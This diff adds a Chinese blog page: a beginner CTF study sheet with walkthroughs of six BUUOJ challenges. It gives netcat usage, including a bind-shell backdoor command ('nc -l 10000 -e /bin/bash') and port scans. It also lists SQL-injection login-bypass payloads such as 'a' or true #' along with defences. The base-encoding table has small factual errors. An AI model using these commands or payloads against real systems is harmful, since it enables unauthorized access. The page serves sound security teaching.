@@ -1,0 +1,500 @@
+<html>
+<head>
+    <meta charset="utf-8"/>
+<meta name="description" content=""/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<title>「回中网安」2：动手实践初步入门-学习单 | IUU6&#39;s Blog</title>
+
+<link rel="shortcut icon" href="https://blog.rzly.net/favicon.ico?v=1729921848626">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://blog.rzly.net/styles/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css">
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dart.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script>
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <div class="navbar-brand">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            IUU6&#39;s Blog
+        </div>
+    </div>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+                <div class="nav-item">
+                    
+                        <a href="/" class="menu gt-a-link">
+                            Home
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/archives" class="menu gt-a-link">
+                            Archives
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/tags" class="menu gt-a-link">
+                            Tags
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/about" class="menu gt-a-link">
+                            About
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/friends" class="menu gt-a-link">
+                            Friends
+                        </a>
+                    
+                </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1729921848626" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    「回中网安」2：动手实践初步入门-学习单
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2024-05-20 ·
+                    </time>
+                    
+                        <a href="https://blog.rzly.net/tag/hui-zhong-wang-an/" class="post-tags">
+                            # 回中网安
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="动手实践初步入门-学习单">动手实践初步入门-学习单</h1>
+<h2 id="1basic-linux-labs">1：Basic-Linux Labs</h2>
+<blockquote>
+<p>题目链接：https://buuoj.cn/challenges#Linux%20Labs</p>
+</blockquote>
+<blockquote>
+<p>这道题目，大家需要学会一些Linux的基本命令，并使用适合的链接工具连接靶场进行攻防测试</p>
+</blockquote>
+<p>题目提示：<strong>ssh 用户名：root 密码：123456 地址和端口为动态分配的</strong></p>
+<p>看到提示就发现它给了我们一个<code>root</code><strong>最高权限</strong>用户的操作用户，因此<strong>猜测</strong>答案就在<strong>某个目录下</strong></p>
+<p>因此启动靶场后使用<code>FinalShell</code>连接服务器</p>
+<h3 id="finalshell使用教程">FinalShell使用教程</h3>
+<figure data-type="image" tabindex="1"><img src="https://blog.rzly.net/post-images/1716212537201.png" alt="" loading="lazy"></figure>
+<ul>
+<li>打开FinalShell</li>
+<li>创建连接</li>
+<li>输入主机名和端口号，以及账号密码</li>
+<li>双击连接</li>
+</ul>
+<figure data-type="image" tabindex="2"><img src="https://blog.rzly.net/post-images/1716212559665.png" alt="" loading="lazy"></figure>
+<h3 id="掌握基本命令">掌握基本命令</h3>
+<ul>
+<li>根据主机名称提示，发现提示我们<code>out</code></li>
+<li>我们尝试返回上级目录，使用命令<code>cd ../</code></li>
+<li>使用<code>ls</code>命令列出当前目录下的所有文件</li>
+<li>发现<code>flag.txt</code>文件</li>
+<li>使用<code>cat flag.txt</code>输出文件内容</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://blog.rzly.net/post-images/1716212570845.png" alt="" loading="lazy"></figure>
+<p>至此，成功获得flag，提交成功！</p>
+<h2 id="2crypto-一眼就解密">2：Crypto-一眼就解密</h2>
+<blockquote>
+<p>题目链接：https://buuoj.cn/challenges#%E4%B8%80%E7%9C%BC%E5%B0%B1%E8%A7%A3%E5%AF%86</p>
+</blockquote>
+<p>打开题目发现提示如下：</p>
+<p><strong>下面的字符串解密后便能获得flag：ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30= 注意：得到的 flag 请包上 flag{} 提交</strong></p>
+<p>观察以下内容<code>ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30=</code>发现应该是<code>base</code>加密族内容，通过特征推测是<code>base64</code>加密，因此找到有关解密工具，例如：https://www.qqxiuzi.cn/bianma/base.php</p>
+<figure data-type="image" tabindex="4"><img src="https://blog.rzly.net/post-images/1716212633080.png" alt="" loading="lazy"></figure>
+<p>解密后发现flag为：<code>flag{THE_FLAG_OF_THIS_STRING}</code></p>
+<h3 id="知识点base加密族">知识点：<code>base</code>加密族</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">编码方式</th>
+<th style="text-align:left">特征</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">base16</td>
+<td style="text-align:left">用于编码的字符只有：1-9，A-F ,只有简单的15个字符</td>
+</tr>
+<tr>
+<td style="text-align:center">base32</td>
+<td style="text-align:left">编码字符有了明显改变，由base16的类型转变为了A-Z,2-7</td>
+</tr>
+<tr>
+<td style="text-align:center">base64</td>
+<td style="text-align:left">最完善，在base32的基础上，增加了&quot;a-z,0,1,8,9,+,/&quot;，以及特殊填充字符&quot;=&quot;</td>
+</tr>
+</tbody>
+</table>
+<p>Base-64编码将一个8位子节序列拆散为6位的片段，并为每个6位的片短分配一个字符，这个字符是Base-64字母表中的64个字符之一。</p>
+<h2 id="3misc-金三胖">3：Misc-金三胖</h2>
+<blockquote>
+<p>题目链接：https://buuoj.cn/challenges#%E9%87%91%E4%B8%89%E8%83%96</p>
+</blockquote>
+<blockquote>
+<p>大家可以自行完成签到题目</p>
+</blockquote>
+<p>题目没有给出任何提示，下载文件后解压发现一张图片，名为<em>aaa.gif</em></p>
+<p>打开图片发现<strong>中间快速闪烁有不正常的帧</strong></p>
+<p>因此我们把它逐帧分析，可以拖入<code>stegsolve</code>完成</p>
+<figure data-type="image" tabindex="5"><img src="https://blog.rzly.net/post-images/1716212643568.png" alt="" loading="lazy"></figure>
+<p>选中<code>frame browser</code>，发现在第21帧、第51帧、第79帧有flag</p>
+<figure data-type="image" tabindex="6"><img src="https://blog.rzly.net/post-images/1716212650038.png" alt="" loading="lazy"></figure>
+<p>得到flag</p>
+<h2 id="4pwn-test_your_nc">4：Pwn-test_your_nc</h2>
+<blockquote>
+<p>题目链接：https://buuoj.cn/challenges#test_your_nc</p>
+</blockquote>
+<h3 id="知识点nc命令">知识点：<code>nc</code>命令</h3>
+<h4 id="nc命令使用help">nc命令使用help：</h4>
+<pre><code class="language-bash">nc [-hlnruz][-g&lt;网关...&gt;][-G&lt;指向器数目&gt;][-i&lt;延迟秒数&gt;][-o&lt;输出文件&gt;][-p&lt;通信端口&gt;][-s&lt;来源位址&gt;][-v...][-w&lt;超时秒数&gt;][主机名称][通信端口...]
+</code></pre>
+<h4 id="参数说明">参数说明：</h4>
+<ul>
+<li>-g&lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个。</li>
+<li>-G&lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数。</li>
+<li>-h 在线帮助。</li>
+<li>-i&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。</li>
+<li>-l 使用监听模式，管控传入的资料。</li>
+<li>-n 直接使用IP地址，而不通过域名服务器。</li>
+<li>-o&lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。</li>
+<li>-p&lt;通信端口&gt; 设置本地主机使用的通信端口。</li>
+<li>-r 乱数指定本地与远端主机的通信端口。</li>
+<li>-s&lt;来源位址&gt; 设置本地主机送出数据包的IP地址。</li>
+<li>-u 使用UDP传输协议。</li>
+<li>-v 显示指令执行过程。</li>
+<li>-w&lt;超时秒数&gt; 设置等待连线的时间。</li>
+<li>-z 使用0输入/输出模式，只在扫描通信端口时使用。</li>
+</ul>
+<h4 id="linux-nc命令的实例">Linux nc命令的实例</h4>
+<p><strong>TCP端口扫描</strong></p>
+<pre><code class="language-bash">nc -v -z -w2 192.168.0.1 1-100
+</code></pre>
+<p><strong>UDP端口扫描</strong></p>
+<pre><code class="language-bash">nc -u -z -w2 192.168.0.1 1-1000
+</code></pre>
+<p><strong>扫描指定端口</strong></p>
+<pre><code class="language-bash">nc -nvv 192.168.0.1 80
+</code></pre>
+<p><strong>监听入站连接</strong></p>
+<pre><code class="language-bash">nc -l 8080
+</code></pre>
+<p><strong>连接远程系统</strong></p>
+<pre><code class="language-bash">nc 192.168.0.1 80
+</code></pre>
+<p><strong>连接UDP端口</strong></p>
+<pre><code class="language-bash">nc -l -u 1234
+</code></pre>
+<p><strong>将nc作为代理</strong></p>
+<p>发往我们<strong>服务器8080端口</strong>的连接都会自动<strong>转发</strong>到<strong>192.168.1.200</strong>上的<strong>80端口</strong></p>
+<pre><code class="language-bash">nc -l 8080 | nc 192.168.1.200 80
+</code></pre>
+<p><strong>使用nc拷贝文件</strong></p>
+<blockquote>
+<p>nc还能用来在系统间拷贝文件，虽然这么做并不推荐，因为绝大多数系统默认都安装了ssh/scp。不过如果你恰好遇见个没有ssh/scp的系统的话，你可以用nc来作最后的努力。</p>
+</blockquote>
+<p>在<strong>要接受数据</strong>的机器上启动nc并让它进入<strong>监听</strong>模式：</p>
+<pre><code class="language-bash">nc -l 8080 &gt; file.txt
+</code></pre>
+<p>现在去<strong>要被拷贝数据的机器上</strong>运行下面命令：</p>
+<pre><code class="language-bash">nc 192.168.1.100 8080 --send-only &lt; data.txt
+</code></pre>
+<p><strong>通过nc创建后门</strong></p>
+<pre><code class="language-bash">nc -l 10000 -e /bin/bash
+</code></pre>
+<p><code>-e</code>标志将一个bash与端口10000相连。现在客户端只要连接到服务器上的10000端口就能通过bash获取我们系统的完整访问权限：</p>
+<pre><code class="language-bash">nc 192.168.1.100 10000
+</code></pre>
+<p><strong>通过nc进行端口转发</strong></p>
+<blockquote>
+<p>所有连接到<strong>80端口</strong>的<strong>连接</strong>都会转发到<strong>8080端口</strong></p>
+</blockquote>
+<pre><code class="language-bash">nc -u -l 80 -c 'ncat -u -l 8080'
+</code></pre>
+<h3 id="解题思路">解题思路</h3>
+<p>题目提示使用<code>nc</code>命令，则猜测只需要<strong>连接远程系统</strong>即可像<em>Basic-Linux Labs</em>一样直接获取Flag内容因此打开<em>WSL</em>下的<em>Kali Linux</em>，输入</p>
+<pre><code class="language-bash">nc [靶场IP] [靶场端口]
+</code></pre>
+<p>例如实践中靶场是<code>node5.buuoj.cn:26335</code></p>
+<p>则输入</p>
+<pre><code class="language-bash">nc node5.buuoj.cn 26335
+</code></pre>
+<p>然后发现在当前目录下就存在flag文件，类似于<em>Basic-Linux Labs</em>直接通过<code>cat</code>命令显示</p>
+<figure data-type="image" tabindex="7"><img src="https://blog.rzly.net/post-images/1716212669482.png" alt="" loading="lazy"></figure>
+<h2 id="5reverse-easyre">5：Reverse-easyre</h2>
+<blockquote>
+<p>题目链接：https://buuoj.cn/challenges#easyre</p>
+</blockquote>
+<p>下载解压得到<em>easyre.exe</em>文件，运行结束发现告诉我们不能得到flag，由于题目简单，我们尝试使用<strong>静态逆向工具IDA Pro</strong></p>
+<p>使用<strong>IDA Pro</strong>打开文件逆向分析后发现flag在一个变量中，直接复制提交即可</p>
+<figure data-type="image" tabindex="8"><img src="https://blog.rzly.net/post-images/1716212680800.png" alt="" loading="lazy"></figure>
+<h2 id="6web-极客大挑战-2019easysql">6：Web-[极客大挑战 2019]EasySQL</h2>
+<blockquote>
+<p>题目链接：<a href="https://buuoj.cn/challenges#%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DEasySQL">https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]EasySQL</a></p>
+</blockquote>
+<h3 id="题目分析">题目分析</h3>
+<p>这是我们第一次接触一个网页来攻击，打开网页发现有两个地方让我们输入<strong>用户名和密码</strong>，因此，我们认为突破口在这里</p>
+<p>尝试使用弱密码攻击<code>admin</code>和<code>123</code>，提示<code>NO,Wrong username password！！！</code>但是请求地址变为</p>
+<pre><code class="language-http">check.php?username=admin&amp;password=123
+</code></pre>
+<p>又因为题目为<strong>EasySQL</strong>，所以尝试使用SQL注入攻击，payload如下内容</p>
+<pre><code class="language-sql">?username=1' and 1=1 &amp;password=1' and 1=1
+</code></pre>
+<p>来测试有没有<strong>数据库注入漏洞</strong>，发现回显</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' and password='1' and 1=1'' at line 1</p>
+</blockquote>
+<h4 id="知识点sql注入原理及如何判断闭合符">知识点：SQL注入原理及如何判断闭合符</h4>
+<p><strong>造成SQL注入的原因：</strong><br>
+在没有对用户的输入进行过滤、检测的情况下，就把用户输入数据，带入到数据库中执行SQL语句。</p>
+<p><strong>利用SQL注入：</strong><br>
+由于系统没有对输入的数据进行过滤、检测，就带入到数据库中执行SQL语句，那么当用户输入一条恶意的数据，使其与原SQL语句拼接、重组得到一条恶意的SQL语句，当数据库执行这条恶意的SQL语句时，就会把数据库中的信息暴露出来，从而泄露信息。</p>
+<figure data-type="image" tabindex="9"><img src="https://blog.rzly.net/post-images/1716212700213.png" alt="" loading="lazy"></figure>
+<p><strong>一般的代码：</strong></p>
+<blockquote>
+<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mi>d</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">id=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span>_GET[‘id’];<br>
+<span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \* at position 13: sql=“SELECT \̲*̲ FROM name WHER…'>sql=“SELECT \* FROM name WHERE id=’</span>id’ LIMIT 0,1”;</p>
+</blockquote>
+<p>我们可以看到，用户输入的<strong>id</strong>是被带到<strong>sql语句</strong>中进行拼接，然后执行的，而且，这个id两边是<strong>被’ ‘(两个单引号)给闭合</strong>起来的，所以在这个代码里**’(单引号)就是闭合符**</p>
+<p>由此，若是我们想<strong>进行SQL注入</strong>，那么就可以通过<strong>给定id</strong>一些<strong>恶意的数据</strong>，让这些<strong>恶意的数据</strong>与<strong>原SQL语句结合</strong>在一起，构成一个<em>新</em>的、恶意的SQL语句，让这个恶意的SQL语句执行成功，从而达到SQL注入的目的。</p>
+<p><strong>防止SQL注入的措施</strong></p>
+<ol>
+<li>SQL语句的执行代码使用预编译 PreparedStatement</li>
+<li>确定每个数据的类型，比如是数字，数据库则必须使用int类型来存储</li>
+<li>限制传入数据的长度，这能够在一定程度上防止sql注入</li>
+<li>严格限制用户使用数据库的权限，能够在一定程度上减少sql注入的危害</li>
+<li>避免直接响应一些 sql 语句执行异常的信息</li>
+<li>过滤参数中含有的一些数据库关键词</li>
+</ol>
+<blockquote>
+<p>因此我们发现这个网站的闭合方式为单引号</p>
+</blockquote>
+<h4 id="知识点mysql中单引号双引号和反引号的区别">知识点：MySQL中单引号，双引号和反引号的区别</h4>
+<p><strong>单引号</strong></p>
+<blockquote>
+<p>一般应使用英文单引号，如果字符串内需要包含单引号时，除了使用转义的办法外，我们可以选用一对双引号来包括字符串，这样字符串内的单引号被视作普通字符，无需特殊处理</p>
+</blockquote>
+<p>例如  <strong>Johnson's mother</strong></p>
+<pre><code class="language-sql">select &quot;Johnson's mother&quot;,'Johnson''s mother','Johnson\'s mother';
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://blog.rzly.net/post-images/1716212719070.jpg" alt="" loading="lazy"></figure>
+<p><strong>双引号</strong></p>
+<blockquote>
+<p>与单引号对应，使用英文双引号引用的字符串内需要包含双引号时，除了使用转义的办法外，我们可以用一对单引号来包括字符串，这样字符串内的双引号被视作普通字符，无需特殊处理。</p>
+</blockquote>
+<p>例如  <strong>He said: &quot;Go away&quot;</strong></p>
+<pre><code class="language-sql">select 'He said: &quot;Go away&quot;' ,&quot;He said: &quot;&quot;Go away&quot;&quot;&quot; ,&quot;He said: \&quot;Go away\&quot;&quot; ;
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://blog.rzly.net/post-images/1716212734844.jpg" alt="" loading="lazy"></figure>
+<p><strong>反引号</strong></p>
+<blockquote>
+<p>反引号，一般在ESC键的下方。它是为了<strong>区分</strong>MYSQL的<strong>保留字</strong>与<strong>普通字符</strong>而引入的符号。</p>
+</blockquote>
+<p>MySQL里使用一对反勾号“ ` ”将识别符括起来，一般情况下可以不用，<strong>单是如果识别符出现关键字冲突或标识符的写法可能产生歧义的情况下就必须使用</strong>。例如：</p>
+<pre><code class="language-sql">create table t1 (id int primary key ,desc varchar(10));   -- 这句会报错
+create table t1 (id int primary key,`desc` varchar(10));  -- 这句客成功运行
+</code></pre>
+<p>举个例子：</p>
+<p>在test表中，有个select字段，如果不用反引号，MYSQL将把select视为保留字而导致出错，所以，<strong>有MYSQL保留字作为字段的，必须加上反引号来区分。</strong></p>
+<pre><code class="language-sql">SELECT `select` FROM `test` WHERE select='字段值'
+</code></pre>
+<p>另外：<strong>建表的时候一般都会将表名，库名都加上反引号来保证语句的执行度</strong>。反引号`，数字1左边的符号。</p>
+<p>保留字<strong>不能</strong>用于<strong>表名</strong>，比如<em>desc</em>，此时<strong>需要加入反引号</strong>来区别，但使用表名时可<strong>忽略反引号</strong>。</p>
+<pre><code class="language-sql">create table desc   -- 报错
+create table `desc` -- 成功
+create table `test` -- 成功
+drop table test     -- 成功
+</code></pre>
+<p>保留字<strong>不能</strong>用于字段名，比如<em>desc</em>，此时也需要<strong>加入反引号</strong>，并且insert等使用时<strong>也</strong>要加上反引号。</p>
+<pre><code class="language-sql">create table `test`（`desc` varchar(255)）  -- 成功
+insert into test(desc) values('fxf')       -- 失败
+insert into test(`desc`) values('fxf')     -- 成功
+</code></pre>
+<h4 id="使用sql注入解题">使用Sql注入解题</h4>
+<blockquote>
+<p>一般来说，有账号密码登陆的题，在判断完闭合方式后，可以尝试先用万能账号密码解题</p>
+</blockquote>
+<p>使用万能账号<code>a' or true #</code>登录，发现成功进入获取flag！</p>
+<figure data-type="image" tabindex="12"><img src="https://blog.rzly.net/post-images/1716212751168.png" alt="" loading="lazy"></figure>
+<h4 id="知识点万能账号密码原理剖析">知识点：万能账号密码原理剖析</h4>
+<p>一个网络安全意识淡薄的网站，其登录功能的SQL语句大概是下面这个样子</p>
+<pre><code class="language-sql">select \* from user where username='user' and password='pass'
+</code></pre>
+<h5 id="万能账号">万能账号</h5>
+<blockquote>
+<p>万能账号并不是一个真正意义上的账号，它是一种【拥有不同变体的格式】</p>
+<p>需要注意的是，以下所有万能账号中的 a 可以是自定义的数字或字母，比如 1，2，3，b，c，d</p>
+</blockquote>
+<p>【数值型万能账号】</p>
+<pre><code class="language-sql">a or true #
+a or 1 #
+a or 1=1 #
+a or true -- a
+a or 1 -- a
+a or 1=1 -- a
+</code></pre>
+<p>【单引号字符型万能密码】</p>
+<pre><code class="language-sql">a' or true #
+a' or 1 #
+a' or 1=1 #
+a' or true --a
+a' or 1 -- a
+a' or 1=1 -- a
+</code></pre>
+<p>【双引号字符型万能密码】</p>
+<pre><code class="language-sql">a&quot; or true #
+a&quot; or 1 #
+a&quot; or 1=1 #
+a&quot; or true -- a
+a&quot; or 1 -- a
+a&quot; or 1=1 -- a
+</code></pre>
+<h6 id="万能账号原理">万能账号原理</h6>
+<p>当我们在登录界面输入 【<strong>万能账号</strong>】比如 <code>a’ or true #</code> 以后，后端会将我们输入的参数拼接到SQL中，然后去数据库中查询账号和密码，SQL语句大概是下面这样</p>
+<pre><code class="language-sql">select \* from user where username='a' or true #' and password='pass'
+</code></pre>
+<p>由于 # 在SQL中是注释符，注释符后面的内容不起作用，所以真正执行的SQL语句大概是下面这样</p>
+<pre><code class="language-sql">select \* from user where username='a' or true
+</code></pre>
+<p><code>or true</code> 会使SQL语句<strong>恒成立</strong>，从而查询出数据库中的<strong>所有账号和密码</strong>，从而使我们<strong>成功登录</strong></p>
+<p><strong>注释符</strong></p>
+<p>除了 # 以外， -- 也是SQL中的注释符，但SQL的语法格式规定--和后面的注释内容<strong>必须间隔一个空格</strong>，所以这需要使用 <code>a' or 1 -- a</code> 而不是 <code>a' or 1 --</code> 其原理和 <code>a’ or 1 #</code> 大同小异，拼接到SQL中大概是下面这样</p>
+<pre><code class="language-sql">select \* from user where username='a' or true -- a' and password='pass'
+</code></pre>
+<p>注释后面的内容不生效，真正执行的SQL大概是下面这样</p>
+<pre><code class="language-sql">select \* from user where username='a' or true
+</code></pre>
+<p>SQL语句<strong>恒成立</strong>，从而<strong>登录成功</strong></p>
+<p>换句话来说，<code>a' or true -- a</code>经过SQL的转化后，结果等价于 <code>a’ or true #</code></p>
+<p><strong>比较运算符</strong></p>
+<p>SQL中规定，<strong>非布尔</strong>类型的数据<strong>参与比较运算</strong>时，会<strong>转化</strong>为布尔类型<strong>再参与运算</strong>。比如 <code>or 1</code> 或者 <code>or 1=1</code> ，会转化为<strong>布尔类型</strong>的 <code>true</code> 再参与 <code>or</code> 的比较运算，也就是变成 <code>or true</code> ，同样能使条件<strong>恒成立</strong>，从而<strong>登录成功</strong></p>
+<p>简单来讲就是：<code>a' or 1 #</code> 或者 <code>a' or 1=1 #</code> 等价于 <code>a' or true #</code></p>
+<h5 id="万能密码">万能密码</h5>
+<blockquote>
+<p>万能密码并不是一个真正意义上的密码，而是一个【拥有不同变体的格式】</p>
+<p>需要注意的是：万能密码中的 admin，必须是真实的用户名</p>
+</blockquote>
+<p>【数值型万能密码】</p>
+<pre><code class="language-sql">admin #
+admin -- a
+</code></pre>
+<p>【单引号字符串型万能密码】</p>
+<pre><code class="language-sql">admin' #
+admin' -- a
+</code></pre>
+<p>【双引号字符串型万能密码】</p>
+<pre><code class="language-sql">admin” #
+admin&quot; -- a
+</code></pre>
+<h6 id="万能密码原理">万能密码原理</h6>
+<p>当我们在登录界面输入 【<strong>万能密码</strong>】 比如 <code>admin’ #</code> 以后，后端会将我们输入的参数拼接到SQL中，大概是下面这样</p>
+<pre><code class="language-sql">select \* from user where username='admin' #' and password='pass'
+</code></pre>
+<p>由于 <code>#</code> 在SQL中是注释符，注释符后面的内容不起作用，所以真正执行的SQL大概是下面这样</p>
+<pre><code class="language-sql">select \* from user where username='admin'
+</code></pre>
+<p>SQL<strong>只会</strong>在数据库中<strong>查询用户名</strong>，而<strong>不是</strong>同时<strong>查询用户名</strong>和<strong>密码</strong>，这就意味着，<strong>只要用户名正确</strong>，就可以<strong>登录成功</strong></p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://blog.rzly.net/post/windows_network_patch/" class="post-title gt-a-link">
+                    Windows联网后却显示未联网的一种解决方案
+                </a>
+            </div>
+        
+
+        
+
+        
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">From the root, begin anew. </div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/iuu6" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Made by <a href="https://github.com/iuu6" target="_blank">IUU6</a> with heart ❤️~
+    </div>
+    <div>
+        Theme by <a href="https://imhanjie.com/" target="_blank">imhanjie</a>, Powered by <a
+                href="https://github.com/getgridea/gridea" target="_blank">Gridea | <a href="https://blog.rzly.net/atom.xml" target="_blank">RSS</a></a>
+    </div>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
